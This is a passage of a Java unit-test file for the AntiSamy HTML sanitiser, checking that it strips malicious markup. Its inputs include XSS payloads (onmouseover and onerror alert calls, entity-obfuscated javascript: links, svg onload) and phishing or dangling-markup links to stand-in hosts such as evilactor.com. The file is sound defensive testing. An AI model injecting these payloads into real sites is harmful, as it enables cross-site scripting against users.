        assertTrue(as.scan("<a href=\"blah\">link</a>", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
        assertTrue(as.scan("<a href=\"blah\">link</a>", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

        // adds properly even with bad attr
        assertTrue(as.scan("<a href=\"blah\" bad=\"true\">link</a>", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
        assertTrue(as.scan("<a href=\"blah\" bad=\"true\">link</a>", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

        // rel with bad value gets corrected
        assertTrue(as.scan("<a href=\"blah\" rel=\"blh\">link</a>", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
        assertTrue(as.scan("<a href=\"blah\" rel=\"blh\">link</a>", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

        // correct attribute doesn't get messed with
        assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\">link</a>", policy, AntiSamy.DOM).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
        assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\">link</a>", policy, AntiSamy.SAX).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

        // if two correct attributes, only one remaining after scan
        assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\" rel=\"nofollow\">link</a>", policy, AntiSamy.DOM).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));
        assertTrue(as.scan("<a href=\"blah\" rel=\"nofollow\" rel=\"nofollow\">link</a>", policy, AntiSamy.SAX).getCleanHTML().contains("<a href=\"blah\" rel=\"nofollow\">link</a>"));

        // test if value is off - does it add?
        assertTrue(!as.scan("a href=\"blah\">link</a>", policy, AntiSamy.DOM).getCleanHTML().contains("nofollow"));
        assertTrue(!as.scan("a href=\"blah\">link</a>", policy, AntiSamy.SAX).getCleanHTML().contains("nofollow"));
    }

    @Test
    public void validateParamAsEmbed() throws ScanException, PolicyException {
        // activate policy setting for this test
        Policy revised = policy.cloneWithDirective(Policy.VALIDATE_PARAM_AS_EMBED, "true").cloneWithDirective(Policy.FORMAT_OUTPUT, "false").cloneWithDirective(Policy.USE_XHTML, "true");

        // let's start with a YouTube embed
        String input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
        String expectedOutput = "<object height=\"340\" width=\"560\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed allowfullscreen=\"true\" allowscriptaccess=\"always\" height=\"340\" src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" width=\"560\" /></object>";
        CleanResults cr = as.scan(input, revised, AntiSamy.DOM);
        assertThat(cr.getCleanHTML(), containsString(expectedOutput));

        String saxExpectedOutput = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\" /></object>";
        cr = as.scan(input, revised, AntiSamy.SAX);
        assertThat(cr.getCleanHTML(), equalTo(saxExpectedOutput));

        // now what if someone sticks malicious URL in the value of the
        // value attribute in the param tag? remove that param tag
        input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://supermaliciouscode.com/badstuff.swf\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
        expectedOutput = "<object height=\"340\" width=\"560\"><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed allowfullscreen=\"true\" allowscriptaccess=\"always\" height=\"340\" src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" width=\"560\" /></object>";
        saxExpectedOutput = "<object width=\"560\" height=\"340\"><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /><embed src=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\" /></object>";
        cr = as.scan(input, revised, AntiSamy.DOM);
        assertThat(cr.getCleanHTML(), containsString(expectedOutput));

        cr = as.scan(input, revised, AntiSamy.SAX);
        assertThat(cr.getCleanHTML(), equalTo(saxExpectedOutput));

        // now what if someone sticks malicious URL in the value of the src
        // attribute in the embed tag? remove that embed tag
        input = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://hereswhereikeepbadcode.com/ohnoscary.swf\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"560\" height=\"340\"></embed></object>";
        expectedOutput = "<object height=\"340\" width=\"560\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /></object>";
        saxExpectedOutput = "<object width=\"560\" height=\"340\"><param name=\"movie\" value=\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\" /><param name=\"allowFullScreen\" value=\"true\" /><param name=\"allowscriptaccess\" value=\"always\" /></object>";

        cr = as.scan(input, revised, AntiSamy.DOM);
        assertThat(cr.getCleanHTML(), containsString(expectedOutput));
        CleanResults scan = as.scan(input, revised, AntiSamy.SAX);
        assertThat(scan.getCleanHTML(), equalTo(saxExpectedOutput));
    }

    @Test
    public void compareSpeedsShortStrings() throws IOException, ScanException, PolicyException {

        double totalDomTime = 0;
        double totalSaxTime = 0;

        int testReps = 1000;

        String html = "<body> hey you <img/> out there on your own </body>";

        for (int j = 0; j < testReps; j++) {
            totalDomTime += as.scan(html, policy, AntiSamy.DOM).getScanTime();
            totalSaxTime += as.scan(html, policy, AntiSamy.SAX).getScanTime();
        }

        System.out.println("Total DOM time short string: " + totalDomTime);
        System.out.println("Total SAX time short string: " + totalSaxTime);
    }

    @Test
    public void profileDom() throws IOException, ScanException, PolicyException {
        runProfiledTest(AntiSamy.DOM);
    }

    @Test
    public void profileSax() throws IOException, ScanException, PolicyException {
        runProfiledTest(AntiSamy.SAX);
    }

    private void runProfiledTest(int scanType) throws ScanException, PolicyException {
        double totalDomTime;

        warmup(scanType);

        int testReps = 9999;

        String html = "<body> hey you <img/> out there on your own </body>";

        Double each = 0D;
        int repeats = 10;
        for (int i = 0; i < repeats; i++) {
            totalDomTime = 0;
            for (int j = 0; j < testReps; j++) {
                totalDomTime += as.scan(html, policy, scanType).getScanTime();
            }
            each = each + totalDomTime;
            System.out.println("Total " + (scanType == AntiSamy.DOM ? "DOM" : "SAX") + " time 9999 reps short string: " + totalDomTime);
        }
        System.out.println("Average time: " + (each / repeats));
    }

    private void warmup(int scanType) throws ScanException, PolicyException {
        int warmupReps = 15000;

        String html = "<body> hey you <img/> out there on your own </body>";

        for (int j = 0; j < warmupReps; j++) {
            as.scan(html, policy, scanType).getScanTime();
        }
    }

    @Test
    public void comparePatternSpeed() throws IOException, ScanException, PolicyException {

        final Pattern invalidXmlCharacters =
                Pattern.compile("[\\u0000-\\u001F\\uD800-\\uDFFF\\uFFFE-\\uFFFF&&[^\\u0009\\u000A\\u000D]]");

        int testReps = 10000;

        String html = "<body> hey you <img/> out there on your own </body>";

        String s = null;
        //long start = System.currentTimeMillis();
        for (int j = 0; j < testReps; j++) {
            s = invalidXmlCharacters.matcher(html).replaceAll("");
        }
        //long total = System.currentTimeMillis() - start;

        //start = System.currentTimeMillis();
        Matcher matcher;
        for (int j = 0; j < testReps; j++) {
            matcher = invalidXmlCharacters.matcher(html);
            if (matcher.matches()) {
                s = matcher.replaceAll("");
            }
        }
        //long total2 = System.currentTimeMillis() - start;

        assertNotNull(s);
        //System.out.println("replaceAllDirect " + total);
        //System.out.println("match then replace: " + total2);
    }

    @Test
    public void testOnsiteRegex() throws ScanException, PolicyException {
    	assertIsGoodOnsiteURL("foo");
    	assertIsGoodOnsiteURL("/foo/bar");
    	assertIsGoodOnsiteURL("../../di.cgi?foo&amp;3D~");
    	assertIsGoodOnsiteURL("/foo/bar/1/sdf;jsessiond=1f1f12312_123123");
    }
    
    void assertIsGoodOnsiteURL(String url) throws ScanException, PolicyException {
    	String html = as.scan("<a href=\"" + url + "\">X</a>", policy, AntiSamy.DOM).getCleanHTML();
        assertThat(html, containsString("href=\""));
	}
    
	@Test
    public void issue10() throws ScanException, PolicyException {
    	assertFalse(as.scan("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertFalse(as.scan("<a href=\"javascript&colon;alert&lpar;1&rpar;\">X</a>", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));
    }
    
    @Test
    public void issue147() throws ScanException, PolicyException {
        URL url = getClass().getResource("/antisamy-tinymce.xml");

        Policy pol = Policy.getInstance(url);
        as.scan("<table><tr><td></td></tr></table>", pol, AntiSamy.DOM);
    }

    @Test
    public void issue75() throws ScanException, PolicyException {
        URL url = getClass().getResource("/antisamy-tinymce.xml");
        Policy pol = Policy.getInstance(url);
        as.scan("<script src=\"<. \">\"></script>", pol, AntiSamy.DOM);
        as.scan("<script src=\"<. \">\"></script>", pol, AntiSamy.SAX);
    }

    @Test
    public void issue144() throws ScanException, PolicyException {
        String pinata = "pi\u00f1ata";
        CleanResults results = as.scan(pinata, policy, AntiSamy.DOM);
        String cleanHTML = results.getCleanHTML();
        assertEquals(pinata, cleanHTML);
    }

    @Test
    public void testWhitespaceNotBeingMangled() throws ScanException, PolicyException {
        String test = "<select name=\"name\"><option value=\"Something\">Something</select>";
        String expected = "<select name=\"name\"><option value=\"Something\">Something</option></select>";
        Policy preserveSpace = policy.cloneWithDirective( Policy.PRESERVE_SPACE, "true" );
        CleanResults preserveSpaceResults = as.scan(test, preserveSpace, AntiSamy.SAX);
        assertEquals( expected, preserveSpaceResults.getCleanHTML() );
    }

    @Test
    public void testDataTag159() throws ScanException, PolicyException {
        /* issue #159 - allow dynamic HTML5 data-* attribute */
        String good = "<p data-tag=\"abc123\">Hello World!</p>";
        String bad = "<p dat-tag=\"abc123\">Hello World!</p>";
        String goodExpected = "<p data-tag=\"abc123\">Hello World!</p>";
        String badExpected = "<p>Hello World!</p>";
        // test good attribute "data-"
        CleanResults cr = as.scan(good, policy, AntiSamy.SAX);
        String s = cr.getCleanHTML();
        assertEquals(goodExpected, s);
        // test bad attribute "dat-"
        cr = as.scan(bad, policy, AntiSamy.SAX);
        s = cr.getCleanHTML();
        assertEquals(badExpected, s);
    }

    @Test
    public void testXSSInAntiSamy151() throws ScanException, PolicyException {
        String test = "<bogus>whatever</bogus><img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" "
            + "onmouseover=\"alert('xss')\">";
        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);
        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);

        assertEquals( results_sax.getCleanHTML(), results_dom.getCleanHTML());
        assertEquals("whatever<img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" />", results_dom.getCleanHTML());
    }

    @Test
    public void testAnotherXSS() throws ScanException, PolicyException {
        String test = "<a href=\"http://example.com\"&amp;/onclick=alert(9)>foo</a>";
        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);
        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);

        assertEquals( results_sax.getCleanHTML(), results_dom.getCleanHTML());
        assertEquals("<a href=\"http://example.com\" rel=\"nofollow\">foo</a>", results_dom.getCleanHTML());
    }

    @Test
    public void testIssue2() throws ScanException, PolicyException {
        String test = "<style onload=alert(1)>h1 {color:red;}</style>";
        assertThat(as.scan(test, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("alert")));
        assertThat(as.scan(test, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("alert")));
    }
    
    /*
     * Mailing list user sent this in. Didn't work, but good test to leave in.
     */
    @Test
    public void testUnknownTags() throws ScanException, PolicyException {
        String test = "<%/onmouseover=prompt(1)>";
        CleanResults saxResults = as.scan(test, policy, AntiSamy.SAX);
        CleanResults domResults = as.scan(test, policy, AntiSamy.DOM);
        assertThat(saxResults.getCleanHTML(), not(containsString("<%/")));
        assertThat(domResults.getCleanHTML(), not(containsString("<%/")));
    }
    
    @Test
    public void testStreamScan() throws ScanException, PolicyException, InterruptedException, ExecutionException {
        String testImgSrcURL = "<img src=\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\" ";
        Reader reader = new StringReader("<bogus>whatever</bogus>" + testImgSrcURL + "onmouseover=\"alert('xss')\">");
        Writer writer = new StringWriter();
        as.scan(reader, writer, policy);
        String cleanHtml = writer.toString().trim();
        assertEquals("whatever" + testImgSrcURL + "/>", cleanHtml);
    }
    
    @Test
    public void testGithubIssue23() throws ScanException, PolicyException {
    	
        // Antisamy Stripping nested lists and tables
    	String test23 = "<ul><li>one</li><li>two</li><li>three<ul><li>a</li><li>b</li></ul></li></ul>";
    	// Issue claims you end up with this:
    	//    <ul><li>one</li><li>two</li><li>three<ul></ul></li><li>a</li><li>b</li></ul>
    	// Meaning the <li>a</li><li>b</li> elements were moved outside of the nested <ul> list they were in
    	
    	// The a.replaceAll("\\s","") is used to strip out all the whitespace in the CleanHTML so we can successfully find
    	// what we expect to find.
        assertThat(as.scan(test23, policy, AntiSamy.SAX).getCleanHTML().replaceAll("\\s",""), containsString("<ul><li>a</li>"));
        assertThat(as.scan(test23, policy, AntiSamy.DOM).getCleanHTML().replaceAll("\\s",""), containsString("<ul><li>a</li>"));
        
        // However, the test above can't replicate this misbehavior.
    }
    
    // TODO: This issue is a valid enhancement request we plan to implement in the future.
    // Commenting out the test case for now so test failures aren't included in a released version of AntiSamy.
/*    @Test
    public void testGithubIssue24() throws ScanException, PolicyException {
    	
        // if we have onUnknownTag set to encode, it still strips out the @ and everything else after the it
    	// DOM Parser actually rips out the entire <name@mail.com> value even with onUnknownTag set
        TestPolicy revisedPolicy = policy.cloneWithDirective("onUnknownTag", "encode");

    	String email = "name@mail.com";
        String test24 = "firstname,lastname<" + email + ">";
        assertThat(as.scan(test24, revisedPolicy, AntiSamy.SAX).getCleanHTML(), containsString(email));
        assertThat(as.scan(test24, revisedPolicy, AntiSamy.DOM).getCleanHTML(), containsString(email));
    }
*/
    @Test
    public void testGithubIssue26() throws ScanException, PolicyException {
        // Potential bypass (False positive)
    	String test26 = "&#x22;&#x3E;&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x61;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;";
    	// Issue claims you end up with this:
    	//   ><img src=a onerror=alert(1)>
    	
        assertThat(as.scan(test26, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("<img src=a onerror=alert(1)>")));
        assertThat(as.scan(test26, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("<img src=a onerror=alert(1)>")));
        
        // But you actually end up with this: &quot;&gt;&lt;img src=a onerror=alert(1)&gt; -- Which is as expected
    }
    
    @Test
    public void testGithubIssue27() throws ScanException, PolicyException {
    	// This test doesn't cause an ArrayIndexOutOfBoundsException, as reported in this issue even though it
    	// replicates the test as described.
        String test27 = "my &test";
        assertThat(as.scan(test27, policy, AntiSamy.DOM).getCleanHTML(), containsString("test"));
        assertThat(as.scan(test27, policy, AntiSamy.SAX).getCleanHTML(), containsString("test"));
    }

static final String test33 = "<html>\n"
    	  + "<head>\n"
    	  + "  <title>Test</title>\n"
    	  + "</head>\n"
    	  + "<body>\n"
    	  + "  <h1>Tricky Encoding</h1>\n"
    	  + "  <h2>NOT Sanitized by AntiSamy</h2>\n"
    	  + "  <ol>\n"
    	  + "    <li><a href=\"javascript&#00058x=alert,x%281%29\">X&#00058;x</a></li>\n"
    	  + "    <li><a href=\"javascript&#00058y=alert,y%281%29\">X&#00058;y</a></li>\n"

    	  + "    <li><a href=\"javascript&#58x=alert,x%281%29\">X&#58;x</a></li>\n"
    	  + "    <li><a href=\"javascript&#58y=alert,y%281%29\">X&#58;y</a></li>\n"

    	  + "    <li><a href=\"javascript&#x0003Ax=alert,x%281%29\">X&#x0003A;x</a></li>\n"
    	  + "    <li><a href=\"javascript&#x0003Ay=alert,y%281%29\">X&#x0003A;y</a></li>\n"

    	  + "    <li><a href=\"javascript&#x3Ax=alert,x%281%29\">X&#x3A;x</a></li>\n"
    	  + "    <li><a href=\"javascript&#x3Ay=alert,y%281%29\">X&#x3A;y</a></li>\n"
    	  + "  </ol>\n"
    	  + "  <h1>Tricky Encoding with Ampersand Encoding</h1>\n"
    	  + "  <p>AntiSamy turns harmless payload into XSS by just decoding the encoded ampersands in the href attribute</a>\n"
    	  + "  <ol>\n"
    	  + "    <li><a href=\"javascript&amp;#x3Ax=alert,x%281%29\">X&amp;#x3A;x</a></li>\n"
    	  + "    <li><a href=\"javascript&AMP;#x3Ax=alert,x%281%29\">X&AMP;#x3A;x</a></li>\n"

    	  + "    <li><a href=\"javascript&#38;#x3Ax=alert,x%281%29\">X&#38;#x3A;x</a></li>\n"
    	  + "    <li><a href=\"javascript&#00038;#x3Ax=alert,x%281%29\">X&#00038;#x3A;x</a></li>\n"

    	  + "    <li><a href=\"javascript&#x26;#x3Ax=alert,x%281%29\">X&#x26;#x3A;x</a></li>\n"
    	  + "    <li><a href=\"javascript&#x00026;#x3Ax=alert,x%281%29\">X&#x00026;#x3A;x</a></li>\n"
    	  + "  </ol>\n"
    	  + "  <p><a href=\"javascript&#x3Ax=alert,x%281%29\">Original without ampersand encoding</a></p>\n"
    	  + "</body>\n"
    	  + "</html>";
    			
    @Test
    public void testGithubIssue33() throws ScanException, PolicyException {
        	
        // Potential bypass

        // Issue claims you end up with this:
        //   javascript:x=alert and other similar problems (javascript&#00058x=alert,x%281%29) but you don't.
        //   So issue is a false positive and has been closed.
        //System.out.println(as.scan(test33, policy, AntiSamy.SAX).getCleanHTML());

        assertThat(as.scan(test33, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("javascript&#00058x=alert,x%281%29")));
        assertThat(as.scan(test33, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("javascript&#00058x=alert,x%281%29")));
    }
    
    // TODO: This issue is a valid enhancement request. We are trying to decide whether to implement in the future.
    // Commenting out the test case for now so test failures aren't included in a released version of AntiSamy.
/*
    @Test
    public void testGithubIssue34a() throws ScanException, PolicyException {

    	// bypass stripNonValidXMLCharacters
    	// Issue indicates: "<div>Hello\\uD83D\\uDC95</div>" should be sanitized to: "<div>Hello</div>"
    	
        String test34a = "<div>Hello\uD83D\uDC95</div>";
        assertEquals("<div>Hello</div>", as.scan(test34a, policy, AntiSamy.SAX).getCleanHTML());
        assertEquals("<div>Hello</div>", as.scan(test34a, policy, AntiSamy.DOM).getCleanHTML());
    }

    @Test
    public void testGithubIssue34b() throws ScanException, PolicyException {

    	// bypass stripNonValidXMLCharacters
    	// Issue indicates: "<div>Hello\\uD83D\\uDC95</div>" should be sanitized to: "<div>Hello</div>"
    	
        String test34b = "\uD888";
        assertEquals("", as.scan(test34b, policy, AntiSamy.DOM).getCleanHTML());
        assertEquals("", as.scan(test34b, policy, AntiSamy.SAX).getCleanHTML());
    }
*/

    static final String test40 = "<html>\n"
          + "<head>\n"
          + "  <title>Test</title>\n"
          + "</head>\n"
          + "<body>\n"
          + "  <h1>Tricky Encoding</h1>\n"
          + "  <h2>NOT Sanitized by AntiSamy</h2>\n"
          + "  <ol>\n"
          + "    <li><h3>svg onload=alert follows:</h3><svg onload=alert(1)//</li>\n"
          + "  </ol>\n"
          + "</body>\n"
          + "</html>";

    @Test
    public void testGithubIssue40() throws ScanException, PolicyException {

        // Concern is that: <svg onload=alert(1)//  does not get cleansed.
        // Based on these test results, it does get cleaned so this issue is a false positive, so we closed it.

        assertThat(as.scan(test40, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("<svg onload=alert(1)//")));
        //System.out.println("SAX parser: " + as.scan(test40, policy, AntiSamy.SAX).getCleanHTML());
        assertThat(as.scan(test40, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("<svg onload=alert(1)//")));
        //System.out.println("DOM parser: " + as.scan(test40, policy, AntiSamy.DOM).getCleanHTML());
    }

    @Test
    public void testGithubIssue48() throws ScanException, PolicyException {

        // Concern is that onsiteURL regex is not safe for URLs that start with //.
        // For example:  //evilactor.com?param=foo

        final String phishingAttempt = "<a href=\"//evilactor.com/stealinfo?a=xxx&b=xxx\"><span style=\"color:red;font-size:100px\">"
                + "You must click me</span></a>";

        // Output: <a rel="nofollow"><span style="color: red;font-size: 100.0px;">You must click me</span></a>

        assertThat(as.scan(phishingAttempt, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("//evilactor.com/")));
        assertThat(as.scan(phishingAttempt, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("//evilactor.com/")));

        // This ones never failed, they're just to prove a dangling markup attack on the following resulting HTML won't work.
        // Less probable case (steal more tags):
        final String danglingMarkup = "<div>User input: " +
                "<input type=\"text\" name=\"input\" value=\"\"><a href='//evilactor.com?"+
                "\"> all this info wants to be stolen with <i>danlging markup attack</i>" +
                " until a single quote to close is found'</div>";

        assertThat(as.scan(danglingMarkup, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("//evilactor.com/")));
        assertThat(as.scan(danglingMarkup, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("//evilactor.com/")));

        // More probable case (steal just an attribute):
        //      HTML before attack: <input type="text" name="input" value="" data-attribute-to-steal="some value">
        final String danglingMarkup2 = "<div>User input: " +
                "<input type=\"text\" name=\"input\" value=\"\" data-attribute-to-steal=\"some value\">";
        
        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("//evilactor.com/")));
        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("//evilactor.com/")));
    }

 @Test
    public void testGithubIssue62() {
        // Concern is that when a processing instruction is at the root level, node removal gets messy and Null pointer exception arises.
        // More test cases are added for PI removal.

        try{
            assertThat(as.scan("|<?ai aaa", policy, AntiSamy.DOM).getCleanHTML(), is("|"));
            assertThat(as.scan("|<?ai aaa", policy, AntiSamy.SAX).getCleanHTML(), is("|"));

            assertThat(as.scan("<div>|<?ai aaa", policy, AntiSamy.DOM).getCleanHTML(), is("<div>|</div>"));
            assertThat(as.scan("<div>|<?ai aaa", policy, AntiSamy.SAX).getCleanHTML(), is("<div>|</div>"));

            assertThat(as.scan("<div><?foo note=\"I am XML processing instruction. I wish to be excluded\" ?></div>", policy, AntiSamy.DOM)
                    .getCleanHTML(), not(containsString("<?foo")));
            assertThat(as.scan("<div><?foo note=\"I am XML processing instruction. I wish to be excluded\" ?></div>", policy, AntiSamy.SAX)
                    .getCleanHTML(), not(containsString("<?foo")));

            assertThat(as.scan("<?xml-stylesheet type=\"text/css\" href=\"style.css\"?>", policy, AntiSamy.DOM).getCleanHTML(), is(""));
            assertThat(as.scan("<?xml-stylesheet type=\"text/css\" href=\"style.css\"?>", policy, AntiSamy.SAX).getCleanHTML(), is(""));

        } catch (Exception exc) {
            fail(exc.getMessage());
        }
    }

    @Test
    public void testGithubIssue81() throws ScanException, PolicyException {
        // Concern is that "!important" is missing after processing CSS
        assertThat(as.scan("<p style=\"color: red !important\">Some Text</p>", policy, AntiSamy.DOM).getCleanHTML(), containsString("!important"));
        assertThat(as.scan("<p style=\"color: red !important\">Some Text</p>", policy, AntiSamy.SAX).getCleanHTML(), containsString("!important"));

        // Just to check scan keeps working accordingly without "!important"
        assertThat(as.scan("<p style=\"color: red\">Some Text</p>", policy, AntiSamy.DOM).getCleanHTML(), not(containsString("!important")));
        assertThat(as.scan("<p style=\"color: red\">Some Text</p>", policy, AntiSamy.SAX).getCleanHTML(), not(containsString("!important")));
    }
}

